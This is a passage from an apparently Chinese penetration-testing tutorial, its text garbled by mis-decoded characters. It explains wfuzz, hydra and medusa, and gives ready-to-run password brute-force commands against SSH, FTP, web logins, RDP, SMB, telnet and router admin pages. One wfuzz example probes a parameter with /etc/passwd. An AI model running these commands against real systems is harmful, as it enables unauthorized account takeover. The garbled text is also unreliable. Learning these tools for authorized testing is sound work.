operator">-</span>wå¼€å¤´ï¼‰ã€‚<span class="token operator">--</span>zEï¼œencoderï¼ï¼šæŒ‡å®šæœ‰æ•ˆè´Ÿè½½çš„ç¼–ç å™¨ï¼ˆå®ƒå¿…é¡»ä»¥<span class="token operator">-</span>zæˆ–<span class="token operator">-</span>wå¼€å¤´ï¼‰ã€‚<span class="token operator">--</span>sliceï¼œfilterï¼ï¼šä½¿ç”¨æŒ‡å®šçš„è¡¨è¾¾å¼è¿‡æ»¤æœ‰æ•ˆè´Ÿè½½çš„å…ƒç´ ã€‚å®ƒå¿…é¡»ä»¥<span class="token operator">-</span>zå¼€å¤´ã€‚<span class="token operator">-</span>w wordlistï¼šæŒ‡å®šwordlistæ–‡ä»¶ï¼ˆ<span class="token operator">-</span>zæ–‡ä»¶çš„åˆ«åï¼Œwordlistï¼‰ã€‚<span class="token operator">-</span><span class="token constant">V</span> alltypeï¼šæ‰€æœ‰å‚æ•°brutformingï¼ˆallvarså’Œallpostï¼‰ã€‚ä¸éœ€è¦<span class="token constant">FUZZ</span>å…³é”®å­—ã€‚<span class="token operator">-</span><span class="token constant">X</span> methodï¼šæŒ‡å®šè¯·æ±‚çš„<span class="token constant">HTTP</span>æ–¹æ³•ï¼Œå³<span class="token constant">HEAD</span>æˆ–<span class="token constant">FUZZ</span><span class="token operator">-</span>b cookieï¼šä¸ºè¯·æ±‚æŒ‡å®šcookieã€‚å¯¹å„ç§cookieé‡å¤é€‰é¡¹ã€‚<span class="token operator">-</span>d postdataï¼šä½¿ç”¨postdataï¼ˆä¾‹å¦‚ï¼šâ€œid<span class="token operator">=</span><span class="token constant">FUZZ</span><span class="token operator">&amp;</span>catalog<span class="token operator">=</span><span class="token number">1</span>â€ï¼‰<span class="token operator">-</span><span class="token constant">H</span> <span class="token literal-property property">headerï¼šä½¿ç”¨headerï¼ˆä¾‹å¦‚ï¼šâ€œCookie</span><span class="token operator">:</span>id<span class="token operator">=</span><span class="token number">1312321</span><span class="token operator">&amp;</span>user<span class="token operator">=</span><span class="token constant">FUZZ</span>â€ï¼‰ã€‚å¯¹å„ç§æ ‡é¢˜é‡å¤é€‰é¡¹ã€‚<span class="token operator">--</span>basic<span class="token operator">/</span>ntlm<span class="token operator">/</span>digest authï¼šæ ¼å¼ä¸ºâ€œuser<span class="token operator">:</span>passâ€æˆ–â€œ<span class="token constant">FUZZ</span><span class="token operator">:</span><span class="token constant">FUZZ</span>â€æˆ–<span class="token operator">--</span>hc<span class="token operator">/</span>hl<span class="token operator">/</span>hw<span class="token operator">/</span>hh <span class="token constant">N</span><span class="token punctuation">[</span>ï¼Œ<span class="token constant">N</span><span class="token punctuation">]</span><span class="token operator">+</span>ï¼šéšè—å…·æœ‰æŒ‡å®šä»£ç <span class="token operator">/</span>è¡Œ<span class="token operator">/</span>å­—<span class="token operator">/</span>å­—ç¬¦çš„å“åº”ï¼ˆä½¿ç”¨<span class="token constant">BBB</span>ä»åŸºçº¿è·å–å€¼ï¼‰<span class="token operator">--</span>sc<span class="token operator">/</span>sl<span class="token operator">/</span>sw<span class="token operator">/</span>sh <span class="token constant">N</span><span class="token punctuation">[</span>ï¼Œ<span class="token constant">N</span><span class="token punctuation">]</span><span class="token operator">+</span>ï¼šæ˜¾ç¤ºå…·æœ‰æŒ‡å®šä»£ç <span class="token operator">/</span>è¡Œ<span class="token operator">/</span>å­—<span class="token operator">/</span>å­—ç¬¦çš„å“åº”ï¼ˆä½¿ç”¨<span class="token constant">BBB</span>è·å–åŸºçº¿å€¼ï¼‰<span class="token operator">--</span>ss<span class="token operator">/</span>hsæ­£åˆ™è¡¨è¾¾å¼ï¼šæ˜¾ç¤º<span class="token operator">/</span>éšè—å†…å®¹ä¸­å…·æœ‰æŒ‡å®šæ­£åˆ™è¡¨è¾¾å¼çš„å“åº”<span class="token operator">--</span>filterï¼œfilterï¼ï¼šä½¿ç”¨æŒ‡å®šçš„ç­›é€‰å™¨è¡¨è¾¾å¼æ˜¾ç¤º<span class="token operator">/</span>éšè—å“åº”ï¼ˆä½¿ç”¨<span class="token constant">BBB</span>ä»åŸºçº¿è·å–å€¼ï¼‰<span class="token operator">--</span>prefilterï¼œfilterï¼ï¼šä½¿ç”¨æŒ‡å®šçš„è¡¨è¾¾å¼åœ¨æ¨¡ç³ŠåŒ–ä¹‹å‰è¿‡æ»¤é¡¹ç›®ã€‚å¯¹ä¸²è”è¿‡æ»¤å™¨é‡å¤ä¸Šè¿°æ­¥éª¤ã€‚</code></pre><h5 id="wfuzzå¸¸è§ç”¨æ³•"><a href="#wfuzzå¸¸è§ç”¨æ³•" class="headerlink" title="wfuzzå¸¸è§ç”¨æ³•"></a>wfuzzå¸¸è§ç”¨æ³•</h5><hr><h6 id="æ¨¡ç³ŠæŸ¥è¯¢GETè¯·æ±‚å‚æ•°"><a href="#æ¨¡ç³ŠæŸ¥è¯¢GETè¯·æ±‚å‚æ•°" class="headerlink" title="æ¨¡ç³ŠæŸ¥è¯¢GETè¯·æ±‚å‚æ•°"></a>æ¨¡ç³ŠæŸ¥è¯¢GETè¯·æ±‚å‚æ•°</h6><pre class="language-none"><code class="language-none">wfuzz -u &quot;http:&#x2F;&#x2F;192.168.1.104&#x2F;test.php?FUZZ&#x3D;&#x2F;etc&#x2F;passwd&quot; -w &#x2F;usr&#x2F;share&#x2F;wfuzz&#x2F;wordlist&#x2F;general&#x2F;common.txt --hh 80</code></pre><p><img src="wfuzz.png" loading="lazy"></p><h6 id="æ¨¡ç³ŠæŸ¥è¯¢POSTè¯·æ±‚å‚æ•°"><a href="#æ¨¡ç³ŠæŸ¥è¯¢POSTè¯·æ±‚å‚æ•°" class="headerlink" title="æ¨¡ç³ŠæŸ¥è¯¢POSTè¯·æ±‚å‚æ•°"></a>æ¨¡ç³ŠæŸ¥è¯¢POSTè¯·æ±‚å‚æ•°</h6><pre class="language-none"><code class="language-none">wfuzz -w &#x2F;usr&#x2F;share&#x2F;wfuzz&#x2F;wordlist&#x2F;general&#x2F;common.txt -d &quot;uname&#x3D;FUZZ&amp;pass&#x3D;FUZZ&quot;  --hc 302 http:&#x2F;&#x2F;192.168.1.102&#x2F;user.php</code></pre><h6 id="æ·»åŠ cookieå‘èµ·è¯·æ±‚"><a href="#æ·»åŠ cookieå‘èµ·è¯·æ±‚" class="headerlink" title="æ·»åŠ cookieå‘èµ·è¯·æ±‚"></a>æ·»åŠ cookieå‘èµ·è¯·æ±‚</h6><pre class="language-none"><code class="language-none">wfuzz -w &#x2F;usr&#x2F;share&#x2F;wfuzz&#x2F;wordlist&#x2F;general&#x2F;common.txt -b cookie&#x3D;value1 -b cookie2&#x3D;value2 http:&#x2F;&#x2F;192.168.1.102&#x2F;FUZZ</code></pre><h6 id="æ·»åŠ è¯·æ±‚å¤´"><a href="#æ·»åŠ è¯·æ±‚å¤´" class="headerlink" title="æ·»åŠ è¯·æ±‚å¤´"></a>æ·»åŠ è¯·æ±‚å¤´</h6><pre class="language-none"><code class="language-none">wfuzz -w &#x2F;usr&#x2F;share&#x2F;wfuzz&#x2F;wordlist&#x2F;general&#x2F;common.txt -H &quot;Referer: 127.0.0.1&quot; http:&#x2F;&#x2F;192.168.1.102&#x2F;FUZZ</code></pre><h6 id="å­åŸŸåæ‰«æ"><a href="#å­åŸŸåæ‰«æ" class="headerlink" title="å­åŸŸåæ‰«æ"></a>å­åŸŸåæ‰«æ</h6><pre class="language-none"><code class="language-none">wfuzz -w &#x2F;usr&#x2F;share&#x2F;amass&#x2F;wordlists&#x2F;subdomains-top1mil-5000.txt -u cc123.com -H &quot;Host:FUZZ.cc123.com&quot; --hw 53</code></pre><p><img src="wfuzz_2.png" loading="lazy"></p><h6 id="çˆ†ç ´401è®¤è¯ç•Œé¢"><a href="#çˆ†ç ´401è®¤è¯ç•Œé¢" class="headerlink" title="çˆ†ç ´401è®¤è¯ç•Œé¢"></a>çˆ†ç ´401è®¤è¯ç•Œé¢</h6><pre class="language-none"><code class="language-none">wfuzz -c -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt --basic mum:FUZZ -u http:&#x2F;&#x2F;192.168.1.106:631&#x2F;admin&#x2F; -b &quot;org.cups.sid&#x3D;f607a41978fbca423d4de60f686fe8f5&quot; -d &quot;org.cups.sid&#x3D;f607a41978fbca423d4de60f686fe8f5&amp;OP&#x3D;add-printer&quot; -Z --hc 401</code></pre><p><img src="wfuzz_3.png" loading="lazy"></p><h4 id="hydra-ä¹å¤´è›‡"><a href="#hydra-ä¹å¤´è›‡" class="headerlink" title="hydra(ä¹å¤´è›‡)"></a>hydra(ä¹å¤´è›‡)</h4><h5 id="ç®€ä»‹-3"><a href="#ç®€ä»‹-3" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h5><p>Hydraæ˜¯ä¸€ä¸ªæš´åŠ›åœ¨çº¿å¯†ç ç ´è§£ç¨‹åºï¼Œä¸€ä¸ªé’ˆå¯¹ç³»ç»Ÿç™»å½•å¯†ç çš„å¿«é€Ÿçˆ†ç ´å·¥å…·ã€‚</p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨Hydraè¿è¡Œä¸€ä¸ªå­—å…¸å¹¶â€æš´åŠ›ç ´è§£â€ä¸€äº›èº«ä»½éªŒè¯æœåŠ¡ï¼Œæƒ³è±¡ä¸€ä¸‹è¯•å›¾åœ¨ç‰¹å®šæœåŠ¡ä¸Šæ‰‹åŠ¨çŒœæµ‹æŸäººçš„å¯†ç ï¼ˆSSH, Webåº”ç”¨ç¨‹åºç™»å½•æ¡†, FTPï¼ŒSNMPï¼‰ï¼Œä½¿ç”¨ Hydra è¿è¡Œå¯†ç å­—å…¸ä»¥ç¡®å®šæ­£ç¡®çš„å¯†ç ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Hydraèƒ½å¤Ÿå°è¯•æš´åŠ›ç ´è§£ä»¥ä¸‹åè®®ï¼š</span>Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracleç›‘å¬å™¨, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTPæšä¸¾, SNMP v1+v2+v3, SOCKS5, SSH <span class="token punctuation">(</span>v1å’Œv2<span class="token punctuation">)</span>, SSHKEY, Subversion, Teamspeak <span class="token punctuation">(</span>TS2<span class="token punctuation">)</span>, Telnet, VMware-Auth, VNCä»¥åŠXMPPç­‰ã€‚</code></pre><h5 id="ä½¿ç”¨è¯­æ³•å’Œå‚æ•°-2"><a href="#ä½¿ç”¨è¯­æ³•å’Œå‚æ•°-2" class="headerlink" title="ä½¿ç”¨è¯­æ³•å’Œå‚æ•°"></a>ä½¿ç”¨è¯­æ³•å’Œå‚æ•°</h5><p>è¯­æ³•ï¼šhydra [-Options] [IP] [service]</p><p>Example:  hydra -l user -P passlist.txt <a href="ftp://192.168.0.1/">ftp://192.168.0.1</a></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-l</span> login å°å†™ï¼ŒæŒ‡å®šç”¨æˆ·åè¿›è¡Œç ´è§£<span class="token parameter variable">-L</span> <span class="token function">file</span> å¤§å†™ï¼ŒæŒ‡å®šç”¨æˆ·çš„ç”¨æˆ·åå­—å…¸<span class="token parameter variable">-p</span> pass å°å†™ï¼Œç”¨äºæŒ‡å®šå¯†ç ç ´è§£ï¼Œå¾ˆå°‘ä½¿ç”¨ï¼Œä¸€èˆ¬é‡‡ç”¨å¯†ç å­—å…¸ã€‚<span class="token parameter variable">-P</span> <span class="token function">file</span> å¤§å†™ï¼Œç”¨äºæŒ‡å®šå¯†ç å­—å…¸ã€‚<span class="token parameter variable">-e</span> ns é¢å¤–çš„é€‰é¡¹ï¼Œnï¼šç©ºå¯†ç è¯•æ¢ï¼Œsï¼šä½¿ç”¨æŒ‡å®šè´¦æˆ·å’Œå¯†ç è¯•æ¢<span class="token parameter variable">-M</span> <span class="token function">file</span> æŒ‡å®šç›®æ ‡ipåˆ—è¡¨æ–‡ä»¶ï¼Œæ‰¹é‡ç ´è§£ã€‚<span class="token parameter variable">-o</span> <span class="token function">file</span> æŒ‡å®šç»“æœè¾“å‡ºæ–‡ä»¶<span class="token parameter variable">-f</span> æ‰¾åˆ°ç¬¬ä¸€å¯¹ç™»å½•åæˆ–è€…å¯†ç çš„æ—¶å€™ä¸­æ­¢ç ´è§£ã€‚<span class="token parameter variable">-t</span> tasks åŒæ—¶è¿è¡Œçš„çº¿ç¨‹æ•°ï¼Œé»˜è®¤æ˜¯16<span class="token parameter variable">-w</span> <span class="token function">time</span> è®¾ç½®æœ€å¤§è¶…æ—¶æ—¶é—´ï¼Œå•ä½<span class="token parameter variable">-v</span> / <span class="token parameter variable">-V</span> æ˜¾ç¤ºè¯¦ç»†è¿‡ç¨‹<span class="token parameter variable">-R</span> æ¢å¤çˆ†ç ´ï¼ˆå¦‚æœç ´è§£ä¸­æ–­äº†ï¼Œä¸‹æ¬¡æ‰§è¡Œ hydra <span class="token parameter variable">-R</span> /path/to/hydra.restore å°±å¯ä»¥ç»§ç»­ä»»åŠ¡ã€‚ï¼‰<span class="token parameter variable">-x</span> è‡ªå®šä¹‰å¯†ç ã€‚</code></pre><pre class="language-bash" data-language="bash"><code class="language-bash">serviceï¼šæŒ‡å®šæœåŠ¡åï¼Œæ”¯æŒçš„æœåŠ¡è·Ÿåè®®æœ‰ï¼štelnetï¼Œftpï¼Œpop3ç­‰ç­‰ã€‚æ³¨æ„ç‚¹ï¼š<span class="token number">1</span>.è‡ªå·±åˆ›å»ºå­—å…¸,ç„¶åæ”¾åœ¨å½“å‰çš„ç›®å½•ä¸‹æˆ–è€…æŒ‡å®šç›®å½•ã€‚<span class="token number">2</span>.å‚æ•°å¯ä»¥ç»Ÿä¸€æ”¾åœ¨æœ€åï¼Œæ ¼å¼æ¯”å¦‚hydra <span class="token function">ip</span> æœåŠ¡ å‚æ•°ã€‚<span class="token number">3</span>.å¦‚æœèƒ½ç¡®å®šç”¨æˆ·åä¸€é¡¹æ—¶å€™ï¼Œæ¯”å¦‚webç™»å½•ç ´è§£ï¼Œç›´æ¥ç”¨ -lå°±å¯ä»¥ï¼Œç„¶åå‰©ä½™æ—¶é—´ç ´è§£å¯†ç ã€‚<span class="token number">4</span>.ç¼ºç‚¹ï¼Œå¦‚æœç›®æ ‡ç½‘ç«™ç™»å½•æ—¶å€™éœ€è¦éªŒè¯ç å°±æ— æ³•ç ´è§£ã€‚<span class="token number">5</span>.man hydraæœ€ä¸‡èƒ½ã€‚<span class="token number">6</span>.æˆ–è€…hydra <span class="token parameter variable">-U</span> http-formç­‰æŸ¥çœ‹å…·ä½“å¸®åŠ©ã€‚</code></pre><h5 id="Kailå­—å…¸"><a href="#Kailå­—å…¸" class="headerlink" title="Kailå­—å…¸"></a>Kailå­—å…¸</h5><p>åœ¨kailä¸­æ˜¯è‡ªå¸¦å­—å…¸çš„ï¼Œå¯ä»¥é€šè¿‡&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbè·¯å¾„è¿›è¡ŒæŸ¥çœ‹ï¼Œå½“ç„¶éƒ½æ˜¯txtæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥è‡ªå·±å‘é‡Œé¢æ·»åŠ ã€‚</p><table><thead><tr><th>æ–‡ä»¶å</th><th>ä»‹ç»</th></tr></thead><tbody><tr><td>big.txt</td><td>å¤§çš„å­—å…¸</td></tr><tr><td>small.txt</td><td>å°çš„å­—å…¸</td></tr><tr><td>catala.txt</td><td>é¡¹ç›®é…ç½®å­—å…¸</td></tr><tr><td>common.txt</td><td>å…¬å…±å­—å…¸</td></tr><tr><td>euskera.txt</td><td>æ•°æ®ç›®å½•å­—å…¸</td></tr><tr><td>extensions_common.txt</td><td>å¸¸ç”¨æ–‡ä»¶æ‰©å±•åå­—å…¸</td></tr><tr><td>indexes.txt</td><td>é¦–é¡µå­—å…¸</td></tr><tr><td>mutations_common.txt</td><td>å¤‡ä»½æ‰©å±•å</td></tr><tr><td>spanish.txt</td><td>æ–¹æ³•åæˆ–åº“ç›®å½•</td></tr><tr><td>others</td><td>æ‰©å±•ç›®å½•ï¼Œé»˜è®¤ç”¨æˆ·åã€é»˜è®¤å¯†ç ç­‰</td></tr><tr><td>stress</td><td>å‹åŠ›æµ‹è¯•</td></tr><tr><td>vulns</td><td>æ¼æ´æµ‹è¯•</td></tr></tbody></table><h5 id="Hydraå¯†ç ç”Ÿæˆå™¨"><a href="#Hydraå¯†ç ç”Ÿæˆå™¨" class="headerlink" title="Hydraå¯†ç ç”Ÿæˆå™¨"></a>Hydraå¯†ç ç”Ÿæˆå™¨</h5><table><thead><tr><th>å‚æ•°</th><th>ä»‹ç»</th></tr></thead><tbody><tr><td>-x MIN:MAX:CHARSET å¯†ç æš´åŠ›ç ´è§£ç”Ÿæˆå™¨</td><td>è§„åˆ™ï¼šMINè¡¨ç¤ºç”Ÿæˆå¯†ç çš„æœ€çŸ­é•¿åº¦ï¼›MAXè¡¨ç¤ºç”Ÿæˆå¯†ç çš„æœ€é•¿é•¿åº¦ï¼›CHARSETè¡¨ç¤ºä½¿ç”¨æŒ‡å®šçš„å­—ç¬¦ç”Ÿæˆå¯†ç ï¼Œâ€™aâ€™è¡¨ç¤ºæ‰€æœ‰çš„å°å†™å­—æ¯ï¼Œâ€™Aâ€™è¡¨ç¤ºæ‰€æœ‰çš„å¤§å†™å­—æ¯,â€™1â€™è¡¨ç¤ºæ‰€æœ‰çš„æ•°å­—ï¼Œå¯¹äºå…¶ä»–å­—ç¬¦ï¼Œåªéœ€è¦æ·»åŠ åœ¨åé¢å³å¯</td></tr><tr><td>-y</td><td>ä½¿ç”¨æ–¹å¼è§-xï¼Œå®ƒè¡¨ç¤ºcharsetçš„å­—ç¬¦æ˜¯å®é™…çš„å­—ç¬¦ï¼Œè€Œä¸æ˜¯æ­£åˆ™è¡¨è¾¾å¼</td></tr><tr><td>-x 3:5:a</td><td>ç”Ÿæˆçš„å¯†ç å­—å…¸é•¿åº¦ä¸º3åˆ°5ä½ï¼Œç”±æ‰€æœ‰çš„å°å†™å­—æ¯ç»„æˆ</td></tr><tr><td>-x 5:8:A1</td><td>ç”Ÿæˆçš„å¯†ç å­—å…¸é•¿åº¦ä¸º5åˆ°8ä½ï¼Œæœ‰æ‰€æœ‰çš„å¤§å†™å­—æ¯å’Œæ•°å­—ç»„æˆ</td></tr><tr><td>-x 5:5&#x2F;%,.-</td><td>ç”Ÿæˆçš„å¯†ç å­—å…¸é•¿åº¦ä¸º5ä½ï¼Œåªç”±â€™&#x2F; % , . -â€˜è¿™5ç§å­—ç¬¦æ„æˆ</td></tr><tr><td>-x 3:5:aA1 -y</td><td>ç”Ÿæˆçš„å¯†ç å­—å…¸é•¿åº¦ä¸º3åˆ°5ä½ï¼Œä¸”åªç”±â€™a A 1â€™è¿™ä¸‰ç§å­—ç¬¦ç»„æˆ</td></tr><tr><td>-x 3:5:aA1.-+#</td><td>ç”Ÿæˆçš„å¯†ç å­—å…¸é•¿åº¦ä¸º3åˆ°8ä½ï¼Œç”±å¤§å°å†™å­—æ¯+æ•°å­—+.-+#è¿›è¡Œç»„åˆã€‚</td></tr></tbody></table><h5 id="Hydraæ¡ˆä¾‹"><a href="#Hydraæ¡ˆä¾‹" class="headerlink" title="Hydraæ¡ˆä¾‹"></a>Hydraæ¡ˆä¾‹</h5><h6 id="æš´ç ´sshç™»å½•å¯†ç "><a href="#æš´ç ´sshç™»å½•å¯†ç " class="headerlink" title="æš´ç ´sshç™»å½•å¯†ç "></a>æš´ç ´sshç™»å½•å¯†ç </h6><p>ä¸ºäº†æµ‹è¯•æ–¹ä¾¿ï¼Œæˆ‘ä»¬åˆ›å»ºä¸¤ä¸ªç®€å•çš„å­—å…¸æ–‡ä»¶</p><p>æ ¹æ®å‘½ä»¤å‚æ•°ï¼Œç»„ç»‡å‚æ•°æ ¼å¼å¦‚ä¸‹ï¼š</p><pre class="language-ruby" data-language="ruby"><code class="language-ruby">root<span class="token variable">@kali</span><span class="token operator">:</span><span class="token operator">/</span>mnt<span class="token comment"># hydra -L user.txt -P password.txt -t 2 -vV -e ns 192.168.154.131 ssh</span></code></pre><h6 id="FTPåè®®ç ´è§£"><a href="#FTPåè®®ç ´è§£" class="headerlink" title="FTPåè®®ç ´è§£"></a>FTPåè®®ç ´è§£</h6><pre class="language-css" data-language="css"><code class="language-css">ç ´è§£ftpï¼šhydra -L ç”¨æˆ·åå­—å…¸ -P å¯†ç å­—å…¸ -t 6 -e ns IPåœ°å€ -v</code></pre><h6 id="httpåè®®ç ´è§£"><a href="#httpåè®®ç ´è§£" class="headerlink" title="httpåè®®ç ´è§£"></a>httpåè®®ç ´è§£</h6><pre class="language-csharp" data-language="csharp"><code class="language-csharp"><span class="token keyword">get</span>æ–¹å¼æäº¤ï¼Œç ´è§£webç™»å½•ï¼šhydra <span class="token operator">-</span>L ç”¨æˆ·åå­—å…¸ <span class="token operator">-</span>P å¯†ç å­—å…¸ <span class="token operator">-</span>t çº¿ç¨‹ <span class="token operator">-</span>v <span class="token operator">-</span>e ns IPåœ°å€ http<span class="token operator">-</span><span class="token keyword">get</span> <span class="token operator">/</span>admin<span class="token operator">/</span>hydra <span class="token operator">-</span>L ç”¨æˆ·åå­—å…¸ <span class="token operator">-</span>P å¯†ç å­—å…¸ <span class="token operator">-</span>t çº¿ç¨‹ <span class="token operator">-</span>v <span class="token operator">-</span>e ns <span class="token operator">-</span>f IPåœ°å€ http<span class="token operator">-</span><span class="token keyword">get</span> <span class="token operator">/</span>admin<span class="token operator">/</span>index<span class="token punctuation">.</span>phppostæ–¹å¼æäº¤ï¼Œç ´è§£webç™»å½•ï¼šhydra <span class="token operator">-</span>f <span class="token operator">-</span>l ç”¨æˆ·å <span class="token operator">-</span>P å¯†ç å­—å…¸ <span class="token operator">-</span>V <span class="token operator">-</span>s <span class="token number">9900</span> IPåœ°å€ http<span class="token operator">-</span>post<span class="token operator">-</span>form <span class="token string">"/admin/index.php?action=login:user=USER&amp;pw=PASS:"</span><span class="token preprocessor property">#/index.php â€¦è¿™ä¸ªæ˜¯ç™»å½•çš„ url</span><span class="token preprocessor property">#åé—¨æ˜¯POSTçš„æ•°æ® å…¶ä¸­çš„ç”¨æˆ·åå¯†ç ä½¿ç”¨ USER PASS æ¥ä»£æ›¿</span><span class="token preprocessor property">#ç„¶åæ˜¯å¦‚æœç™»å½•å‡ºé”™ ä¼šå‡ºç°çš„å­—ç¬¦ ã€‚ã€‚ã€‚ç„¶åå¼€å§‹ç ´è§£</span></code></pre><h6 id="httpsåè®®ç ´è§£"><a href="#httpsåè®®ç ´è§£" class="headerlink" title="httpsåè®®ç ´è§£"></a>httpsåè®®ç ´è§£</h6><pre class="language-bash" data-language="bash"><code class="language-bash">ç ´è§£httpshydra <span class="token parameter variable">-m</span> /index.php <span class="token parameter variable">-l</span> ç”¨æˆ·å <span class="token parameter variable">-P</span> å¯†ç å­—å…¸.txt IPåœ°å€ https</code></pre><h6 id="è·¯ç”±å™¨ç ´è§£"><a href="#è·¯ç”±å™¨ç ´è§£" class="headerlink" title="è·¯ç”±å™¨ç ´è§£"></a>è·¯ç”±å™¨ç ´è§£</h6><pre class="language-bash" data-language="bash"><code class="language-bash">hydra <span class="token parameter variable">-l</span> admin <span class="token parameter variable">-x</span> <span class="token number">6</span>:10:1a.~<span class="token operator">!</span>@<span class="token comment">#$%^&amp;()-= -t 8 192.168.1.1 http-get /</span><span class="token parameter variable">-l</span> admin ä¸ºå°è¯•ç ´è§£çš„ç”¨æˆ·åã€‚<span class="token comment"># -x 6:10:1a. è¡¨ç¤ºæšä¸¾çš„å¯†ç ç”± æ•°å­—ã€å°å†™å­—æ¯å’Œå•å­—ç¬¦â€™.'ç­‰ç­‰ç»„æˆï¼Œé•¿åº¦ä¸º 6 - 10 ä½ã€‚-t 8 è¡¨ç¤ºåˆ† 8 ä¸ªå¹¶è¡Œä»»åŠ¡è¿›è¡Œçˆ†ç ´å°è¯•ã€‚192.168.1.1 ä¸º Router åœ°å€ã€‚http-get ä¸ºç ´è§£æ–¹å¼ï¼ˆåè®®ï¼‰</span></code></pre><h6 id="http-proxyåè®®ç ´è§£"><a href="#http-proxyåè®®ç ´è§£" class="headerlink" title="http-proxyåè®®ç ´è§£"></a>http-proxyåè®®ç ´è§£</h6><pre class="language-cpp" data-language="cpp"><code class="language-cpp">ç ´è§£http<span class="token operator">-</span>proxyï¼šhydra <span class="token operator">-</span>l admin <span class="token operator">-</span>P å­—å…¸<span class="token punctuation">.</span>txt http<span class="token operator">-</span>proxy<span class="token operator">:</span><span class="token comment">//IPåœ°å€</span></code></pre><h6 id="smbç ´è§£"><a href="#smbç ´è§£" class="headerlink" title="smbç ´è§£"></a>smbç ´è§£</h6><pre class="language-css" data-language="css"><code class="language-css">ç ´è§£smbï¼šhydra -l ç”¨æˆ·åå­—å…¸ -P å¯†ç å­—å…¸ IPåœ°å€ smb</code></pre><h6 id="Windowsè¿œç¨‹æ¡Œé¢"><a href="#Windowsè¿œç¨‹æ¡Œé¢" class="headerlink" title="Windowsè¿œç¨‹æ¡Œé¢"></a>Windowsè¿œç¨‹æ¡Œé¢</h6><pre class="language-scss" data-language="scss"><code class="language-scss">ç ´è§£<span class="token function">rdp</span><span class="token punctuation">(</span>windowsè¿œç¨‹ç™»å½•<span class="token punctuation">)</span>ï¼šhydra ipåœ°å€ rdp -l administrator -P å¯†ç å­—å…¸.txt -V</code></pre><h6 id="é‚®ç®±pop3"><a href="#é‚®ç®±pop3" class="headerlink" title="é‚®ç®±pop3"></a>é‚®ç®±pop3</h6><pre class="language-css" data-language="css"><code class="language-css">ç ´è§£é‚®ç®±pop3ï¼šhydra -l ç”¨æˆ·å -P å¯†ç å­—å…¸.txt my.pop3.mail pop3</code></pre><h6 id="telnetç ´è§£"><a href="#telnetç ´è§£" class="headerlink" title="telnetç ´è§£"></a>telnetç ´è§£</h6><pre class="language-css" data-language="css"><code class="language-css">hydra ipåœ°å€ telnet -l ç”¨æˆ·å­—å…¸.txt -P å¯†ç å­—å…¸.txt -t 32 -s 23 -e ns -f -V</code></pre><h6 id="è¯­éŸ³é€šè®¯å·¥å…·teamspeak"><a href="#è¯­éŸ³é€šè®¯å·¥å…·teamspeak" class="headerlink" title="è¯­éŸ³é€šè®¯å·¥å…·teamspeak"></a>è¯­éŸ³é€šè®¯å·¥å…·teamspeak</h6><pre class="language-css" data-language="css"><code class="language-css">hydra -l ç”¨æˆ·åå­—å…¸ -P å¯†ç å­—å…¸.txt -s ç«¯å£å· -vV ip teamspeak</code></pre><h6 id="cisco"><a href="#cisco" class="headerlink" title="cisco"></a>cisco</h6><pre class="language-css" data-language="css"><code class="language-css">hydra -P å¯†ç å­—å…¸ IPåœ°å€ ciscohydra -m cloud -P å¯†ç å­—å…¸ IPåœ°å€ cisco-enable</code></pre><h4 id="medusa-ç¾æœè"><a href="#medusa-ç¾æœè" class="headerlink" title="medusa(ç¾æœè)"></a>medusa(ç¾æœè)</h4><h5 id="ç®€ä»‹-4"><a href="#ç®€ä»‹-4" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h5><p>Medusa(ç¾æœè)æ˜¯ä¸€ä¸ªé€Ÿåº¦å¿«ï¼Œæ”¯æŒå¤§è§„æ¨¡å¹¶è¡Œï¼Œæ¨¡å—åŒ–ï¼Œçˆ†ç ´ç™»å½•ã€‚å¯ä»¥åŒæ—¶å¯¹å¤šä¸ªä¸»æœºï¼Œç”¨æˆ·æˆ–å¯†ç æ‰§è¡Œå¼ºåŠ›æµ‹è¯•ã€‚Medusa å’Œ hydra ä¸€æ ·ï¼ŒåŒæ ·å±äºåœ¨çº¿å¯†ç ç ´è§£å·¥å…·ã€‚ä¸åŒçš„æ˜¯ï¼Œmedusa çš„ç¨³å®šæ€§ç›¸è¾ƒäº hydra è¦å¥½å¾ˆå¤šï¼Œä½†å…¶æ”¯æŒæ¨¡å—è¦æ¯” hydra å°‘ä¸€äº›ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># medusaæ”¯æŒä¸€ä¸‹åè®®</span>AFP, CVS, FTP, HTTP, IMAP, MS-SQL, MySQL, NCP <span class="token punctuation">(</span>NetWare<span class="token punctuation">)</span>,NNTP, PcAnywhere, POP3, PostgreSQL, rexec, RDPã€rlogin, rsh, SMBNT, SMTP<span class="token punctuation">(</span>AUTH/VRFY<span class="token punctuation">)</span>, SNMP, SSHv2, SVN, Telnet, VmAuthd, VNCã€Generic Wrapperä»¥åŠWebè¡¨å•</code></pre><h5 id="ä½¿ç”¨è¯­æ³•å’Œå‚æ•°-3"><a href="#ä½¿ç”¨è¯­æ³•å’Œå‚æ•°-3" class="headerlink" title="ä½¿ç”¨è¯­æ³•å’Œå‚æ•°"></a>ä½¿ç”¨è¯­æ³•å’Œå‚æ•°</h5><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># ä½¿ç”¨è¯­æ³•</span>medusa <span class="token punctuation">[</span>options<span class="token punctuation">]</span> <span class="token parameter variable">-h</span> <span class="token operator">&lt;</span>ç›®æ ‡ä¸»æœº<span class="token operator">></span> <span class="token parameter variable">-u</span> <span class="token operator">&lt;</span>ç”¨æˆ·å<span class="token operator">></span> <span 